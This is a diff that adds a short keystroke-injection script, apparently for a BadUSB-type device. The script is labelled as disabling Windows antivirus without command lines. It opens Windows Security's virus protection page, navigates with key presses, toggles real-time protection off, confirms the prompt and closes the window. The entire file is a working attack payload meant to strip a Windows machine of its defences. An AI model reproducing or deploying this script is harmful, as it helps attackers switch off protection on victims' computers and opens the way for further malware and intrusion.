@@ -1,0 +1,26 @@
+Rem:WINDOWS
+Rem:Disables the Windows AV without using command lines
+Rem:-----
+Press:131
+CustomDelay:10
+Print:Virus
+CustomDelay:500
+Press:176
+CustomDelay:1000
+Press:179
+CustomDelay:50
+Press:179
+CustomDelay:50
+Press:179
+CustomDelay:50
+Press:179
+CustomDelay:50
+Press:176
+CustomDelay:100
+Press:32
+CustomDelay:1500
+Press:216
+CustomDelay:10
+Press:176
+CustomDelay:1000
+Press:130+197
